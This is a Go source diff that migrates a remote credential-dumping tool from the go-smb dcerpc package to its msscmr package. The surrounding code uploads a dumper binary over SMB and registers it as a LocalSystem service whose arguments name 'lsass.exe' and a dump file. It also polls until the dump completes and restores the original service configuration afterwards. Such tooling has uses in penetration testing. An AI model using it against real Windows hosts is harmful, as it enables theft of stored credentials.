@@ -37,13 +37,14 @@ import (
 
 	"github.com/jfjallid/go-smb/smb"
 	"github.com/jfjallid/go-smb/smb/dcerpc"
+	"github.com/jfjallid/go-smb/smb/dcerpc/msscmr"
 	"github.com/jfjallid/go-smb/spnego"
 	"github.com/jfjallid/golog"
 )
 
 var log = golog.Get("")
 var release string = "0.3.2"
-var bind *dcerpc.ServiceBind
+var bind *msscmr.RPCCon
 var session *smb.Connection
 
 func isFlagSet(name string) bool {
@@ -66,7 +67,7 @@ func installService(serviceName, exePath string, args []string, modify bool, bac
 	// If service already exists, abort
 	_, err = bind.GetServiceStatus(serviceName)
 	if err != nil {
-		if err != dcerpc.ServiceResponseCodeMap[dcerpc.ErrorServiceDoesNotExist] {
+		if err != msscmr.ServiceResponseCodeMap[msscmr.ErrorServiceDoesNotExist] {
 			log.Errorln(err)
 			return
 		}
@@ -111,14 +112,14 @@ func installService(serviceName, exePath string, args []string, modify bool, bac
 
 	if createService {
 		// Create the service
-		err = bind.CreateService(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", "", serviceName, false)
+		err = bind.CreateService(serviceName, msscmr.ServiceWin32OwnProcess, msscmr.ServiceDemandStart, msscmr.ServiceErrorIgnore, exePath, "LocalSystem", "", serviceName, false)
 		if err != nil {
 			log.Errorln(err)
 			return
 		}
 		created = true
 	} else {
-		err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", "", "")
+		err = bind.ChangeServiceConfig(serviceName, msscmr.ServiceWin32OwnProcess, msscmr.ServiceDemandStart, msscmr.ServiceErrorIgnore, exePath, "LocalSystem", "", "", "", "", 0)
 		if err != nil {
 			log.Errorln(err)
 			return
@@ -161,12 +162,14 @@ func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string,
 		}
 		defer svcctl.CloseFile()
 
-		bind, err = dcerpc.Bind(svcctl, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
+		var serviceBind *dcerpc.ServiceBind
+		serviceBind, err = dcerpc.Bind(svcctl, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
 		if err != nil {
 			log.Errorln("Failed to bind to service")
 			log.Errorln(err)
 			return
 		}
+		bind = msscmr.NewRPCCon(serviceBind)
 	}
 
 	if deleteService {
@@ -185,7 +188,7 @@ func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string,
 		}
 		var f *os.File
 		var n int
-		var config *dcerpc.ServiceConfig = &dcerpc.ServiceConfig{}
+		var config *msscmr.ServiceConfig = &msscmr.ServiceConfig{}
 		f, err = os.Open(backupFile)
 		if err != nil {
 			log.Errorln(err)
@@ -206,7 +209,7 @@ func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string,
 			log.Errorln(err)
 			return
 		}
-		err = bind.ChangeServiceConfig2(serviceName, config)
+		err = bind.ChangeServiceConfigExt(serviceName, config)
 		if err != nil {
 			log.Errorln(err)
 			return
@@ -614,12 +617,13 @@ func main() {
 	log.Infof("Successfully uploaded %s to %s%s\n", dumper, svcBinaryPath, svcBinaryName)
 
 	// Create and start service
-	bind, err = dcerpc.Bind(svcctl, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
+	serviceBind, err := dcerpc.Bind(svcctl, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
 	if err != nil {
 		log.Errorln("Failed to bind to service")
 		log.Errorln(err)
 		return
 	}
+	bind = msscmr.NewRPCCon(serviceBind)
 
 	createdNewService, err = installService(serviceName, svcBinaryPath+svcBinaryName, []string{"lsass.exe", dumpDir + dumpFileName}, modify, backupFile)
 	if err != nil {
@@ -634,7 +638,7 @@ func main() {
 			return
 		}
 
-		if (status == dcerpc.ServiceRunning) || (status == dcerpc.ServiceStartPending) {
+		if (status == msscmr.ServiceRunning) || (status == msscmr.ServiceStartPending) {
 			time.Sleep(time.Second)
 		} else {
 			// Hopefully the dump is completed
